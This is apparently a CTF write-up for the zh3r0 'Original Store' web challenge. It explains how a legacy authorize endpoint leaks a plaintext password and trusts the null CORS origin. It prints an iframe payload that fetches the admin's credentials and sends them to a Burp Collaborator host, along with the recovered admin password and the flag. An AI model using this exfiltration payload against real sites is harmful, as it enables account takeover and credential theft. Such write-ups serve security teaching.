---
layout: post
title: "Original Store"
author: "shreyas-sriram"
tags: ['Web']
---

Hi! Check out our car dealership platform - the Original Store at [Store](http://web.zh3r0.cf:6996). We also have a contest running right now and who has the best car wins! You can send us your car's images at [bot](http://web.zh3r0.cf:9696).

## Solution
- Login process uses an endpoint `/api/v3/authorize.php` for authenticating credentials
- This endpoint returns a JSON response with `username` and `password` in plain text, however the password value was removed due to security reasons
- Trying an older API, `/api/v1/authorize.php`, reveals the `password` in plain text
- On closer inspection, this endpoint also had a CORS misconfiguration with trusted `null` origin
- The following HTML can be used to exploit the vulnerability

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','http://localhost:80/api/v1/authorize.php',true);
    req.withCredentials = true;
    req.send();
    
    function reqListener() {
        location='https://leet.burpcollaborator.net/flag?c='+encodeURIComponent(this.responseText);
    };
    </script>"></iframe> 
```

- Host the above HTML and send the link to the admin bot, wait to receive the `admin password` in Burp Collaborator

```
// admin password
V3ryStr0ngP4ssw0rdF0rN0Cr4ck
```

- Login as admin to obtain the flag

## Flag
```
zh3r0{4dm1n_l0ves_0nly_0r1g1n4ls_br0}
```
